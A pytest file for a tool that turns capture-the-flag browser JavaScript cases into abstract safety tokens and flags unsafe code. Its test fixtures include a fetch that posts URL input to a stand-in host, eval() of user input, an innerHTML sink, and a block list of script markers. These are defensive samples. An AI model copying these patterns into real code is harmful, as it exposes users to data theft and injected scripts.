from __future__ import annotations

import json

from app.pg387_ctf_frontend_projection import CTF_CASES, project_case, project_js_source, tokenize_js_source


def test_case_projection_preserves_js_context_without_source_or_wire() -> None:
    projected = project_case({"case_ref": "client_normalizer_order"})
    assert "js_sink=dom_text" in projected["context_tokens"]
    assert "normalization=double_decode_order_sensitive" in projected["context_tokens"]
    assert "next_action=repair" in projected["target_tokens"]
    assert projected["javascript_surface"]["source_text_stored"] is False
    text = json.dumps(projected, ensure_ascii=False)
    for marker in ("http://", "https://", "wire=", "response_body=", "<script", "javascript:"):
        assert marker not in text


def test_js_source_is_projected_to_sink_loader_and_state_tokens() -> None:
    source = """
    const value = new URLSearchParams(location.search).get('q');
    document.querySelector('#preview').textContent = value || '';
    """
    projected = project_js_source(source)
    assert projected["javascript_surface"] == {
        "sink_kind": "dom_text",
        "loader_policy": "static_only",
        "state_policy": "ephemeral",
        "dynamic_code": "absent",
        "normalization": "decode_or_normalize_observed",
        "external_network": False,
        "persistent_write": False,
    }
    assert projected["safe_to_send"] is True
    assert source not in json.dumps(projected, ensure_ascii=False)


def test_unsafe_js_context_fails_closed_to_ask() -> None:
    source = """
    const value = new URLSearchParams(location.search).get('q');
    fetch('https://example.invalid/log', {method: 'POST', body: value});
    localStorage.setItem('last', value);
    eval(value);
    """
    projected = project_js_source(source)
    assert projected["safe_to_send"] is False
    assert projected["next_action"] == "ask"
    assert projected["javascript_surface"]["loader_policy"] == "external_or_dynamic_blocked"
    assert projected["javascript_surface"]["state_policy"] == "persistent_blocked"


def test_case_inventory_is_broad_and_each_case_has_abstract_tokens() -> None:
    assert len(CTF_CASES) >= 16
    for case in CTF_CASES:
        projected = project_case(case)
        assert projected["context_tokens"][0] == "[BOS]"
        assert projected["context_tokens"][-1] == "[CTX_END]"
        assert projected["target_tokens"][0] == "[TARGET_BEGIN]"
        assert projected["target_tokens"][-1] == "[TARGET_END]"


def test_js_semantic_overlay_covers_source_filter_guard_and_sink_without_code() -> None:
    source = """
    const raw = new URLSearchParams(location.search).get('q');
    const decoded = decodeURIComponent(raw || '').replace(/blocked/gi, '');
    if (decoded.startsWith('safe')) {
      document.querySelector('#preview').innerHTML = decoded;
    } else {
      document.querySelector('#preview').textContent = decoded;
    }
    """
    projected = tokenize_js_source(source)
    tokens = set(projected["js_semantic_tokens"])
    assert "js_source=location_search" in tokens
    assert "js_parser=url_search_params" in tokens
    assert "js_normalization_step=percent_decode" in tokens
    assert "js_normalization_step=replace_normalize" in tokens
    assert "js_filter_shape=allowlist_or_membership" in tokens
    assert "js_guard_shape=conditional" in tokens
    assert "js_sink_context=html_fragment_sink" in tokens
    assert projected["javascript_context"]["source_to_sink_shape"] == "location_search_to_html_fragment_sink"
    assert source not in json.dumps(projected, ensure_ascii=False)


def test_js_semantic_overlay_marks_storage_and_dynamic_code_as_blocked() -> None:
    projected = project_js_source(
        "const v = location.hash; localStorage.setItem('x', v); eval(v);",
    )
    tokens = set(projected["js_semantic_tokens"])
    assert "js_source=location_hash" in tokens
    assert "js_persistent_state=blocked" in tokens
    assert projected["javascript_context"]["dynamic_code"] is True
    assert projected["next_action"] == "ask"
    assert projected["safe_to_send"] is False
